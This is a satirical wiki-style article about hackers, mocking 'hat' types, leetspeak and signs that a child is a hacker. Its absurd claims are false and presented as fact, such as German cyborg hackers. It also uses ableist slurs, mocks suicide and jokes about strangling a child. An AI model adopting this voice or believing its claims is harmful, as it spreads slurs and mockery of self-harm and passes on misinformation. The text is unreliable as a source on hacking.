Hacker
''See also: [[Hacking]]''

[[Image:H4x0r.jpeg|thumb|150px|One of the characteristics of a '''h4X0r''' is the crazed look in his eye, that [[1337|amazing typing speed]], and the hunched back that overcomes him when he is in the vicinity of a [[computer]].]]

[[Image:Infection front.JPG|thumb|Playing this game does not make you a hacker.]]

A '''hacker''' ('''h4x0r''') does one thing by nature: he [[masturbation|hacks away]] at [[CP|something]] until it does what he wants, stealing your [[internets]] and megahertz in the process. Do not listen to [[n00b|those]] who tell you that hackers do not have magical powers: hackers can talk to your computer and explode electric grids with their minds. [[Some argue]] that hacking is just about "messing with stuff" and "writing some cool shit for my box," but this is just a public relations ploy meant to keep you from the truth: hackers are, in reality, a race of [[Fact|German cyborgs who seek to repopulate the planet with their own kind. You will be nothing but a slave in their technocratic kingdom of lies.]]

Hackers do not have [[girlfriends]], as they find sexual pleasure in cross-over cables while waiting patiently for the establishment of cyberspace sex drones that will cater to their every whim when the revolution comes.

People who claim to be "PRO HACKERS" are true elite script kiddys that hack [[Fail|Windows Command Prompt]], or tweak their shitty version of Windows XP to have [[Virus|faster performance]]  . You can troll these claimed hackers by frequently asking them if they are hacking into the mainframe, or if they are just hacking.

Please note [[Teenagers]] logging into [[Runescape]] and tricking someone into screaming out their password does ''not'' qualify as hacking. We're so very Sorry  =o(

Hackers communicate in an encrypted language called [[Leet|leetspeak]]. ROT13 is also a common way for hackers to talk in "codes". If there is gibberish on your screen, you are getting haxed and you should immediately turn your computer off. Typical hacker cool coding could possibly look like this: '''a3*900adc9800said90fi()lulz%A)*&)$*)@iov**7o;osaidjfoijioi -- .>/aslkdk'''.

You too can [[lie|become a hacker]] too simply by typing '''javascript: document.body.contentEditable = 'true'; document.designMode = 'on'; void 0''' in your address bar.

==Types of Hackers==
*'''White Hat Hacker''' - [[Loser|Basement-dwelling]] computer security workers who have sold out to [[The_Man|the man]] and work with [[cops|law enforcement]] and [[capitalism|corporations]] to try and stop hackers.  Often these people were once hackers - or wanted to be hackers - before they sold their souls.  For this reason they title themselves "White Hat Hackers", so that they can still feel as though they are part of the hacking community, even though they are just retarded.  For every 1 'White Hat Hacker' that you see online there are 5 [[Feds]] lurking in the background.

*'''Black Hat Hacker''' - Evil sentient beings, similar to [[ninja|ninjas]] that have only one purpose: Writing hundreds of viruses and hacking the [[Government|Pentagon]]. They hack in secret, often [[basement_dweller|in the dark]], and do not always need a computer to hack something - They can hack using cellphones, calculators, gameboys, oxygen, microwaves, [[Fuckin Magnets|magnets]], televisions, gum, and of course axes. They are always ahead of White Hat nerds because they do not have to write reports or follow direction due to not actually having jobs. "1337" hackers who know [[at least 100 years ago|at least 100]] programming languages.

*'''Grey Hat Hackers''' - White Hat retards that think that they can still be [[ninja|cool]] like real hackers, but always fail when their ethos collapses in on itself with a logical paradox; [[Divide by 0|They must ultimately hack themselves to stop themselves from hacking]]. Grey Hat Hackers are prone to [[emo|self-harm]] and there are no great Grey Hat Hackers because to achieve greatness they must [[an_hero|suicides]]. Such types of hackers would include [http://www.youtube.com/user/TheInfectedSource TheInfectedSource]

*'''rm Monkey''' - A rm Monkey wears no hat because he has eaten it. A rm Monkey will always destroy what it hacks by deleting everything on the system whether it is of value or not. Often a rm Monkey will go on a rm'ing spree, a nihilistic rampage whereby he hacks and rm's everything in sight. Often the only reason a rm Monkey will break into a system is so that he may delete everything on it.

*'''Script Kiddies''' - [[13_year_old_boys|14 year old idiots]] with [[USI]] that think they are 1337 because they can write HTML. Barely. "I am a 1337 haxxor lol. ima gonna write sum html to bring down da Microsoft servers lol rofl"

*'''Youtube Hackers''' - Although some contain actual skill to cause widespread panic, most of the "hackers" on youtube are people who take hacking to a non-existant level their method of "hacking" involves doing stupid shit to house hold items which 99% of the time have nothing to do with computers. Such "1337 hacks" include:

==How to Tell if Your Child is a Hacker==
According to [[Is Your Son a Computer Hacker?]], your child may be under the bad influence of hackers, but it is ''not too late'' for intervention.  Your child is a hacker if he displays the following habits:
[[Image:H4CKZ.jpg|thumb|H4X0R5 C4N D0 4NY7H6 3V3N YU0R [[Mom]]!!]]

*Ask you to switch away from [[AOL]] in order to circumvent the child safety features.
*Installs new programs like "[[Flash]]".
*Asks for a new "processor" from [[AMD]].
*Starts reading books by [[Eric S. Raymond]].
*Says the word "JPL".
*Uses ''[[Quake]]''.
*Is obsessed with "[[Linux|Lunix]]".
*Starts wearing bright clothing.
*Says the word [[cyberpunk]].
*Plays ''[[Counter-Strike]]'' obsessively.
*Uploads 'Laughing Skull' viruses to the school maclab network in an attempt to spread the nerd gospel: "[[apple|MACS SUK!!111]]".
*School nurse calls home to complain about your child's poor hygiene.
*Throws away the mouse, in favor of the much easier and more practical [[keyboard]].
*Turns the light off whenever he uses the computer.

If your child is at this point already, there is nothing to do but strangle them with their computer power cable. Once they are this far along, the only cure is the sweet release of [[death]].

Thankfully, [[Microsoft]] has offered this [http://www.microsoft.com/athome/security/children/kidtalk.mspx primer] on [[1337|hacker talk]] to help you [[LOL WUT|decipher]] your child's l33t speech patterns -- and hopefully keep him from iniquity.

==An Example of A Victim==
<center>He's also [[Lol|Chinese]]</center>

==Respect==
*Never call a [[coding|coder]] or programmer anything except a hacker.
*Don't refer to them as hackers, either, as then your [[internets]] will get haxxed.
*If you are unsure whether to address the hacker as a hacker for fear that they will hack you, a simple "my liege" or "god" will suffice.
[[Real Life Super Hero#DANGERMAN|DANGERMAN]] is a [[Retard|guy]] with no respect for hackers:
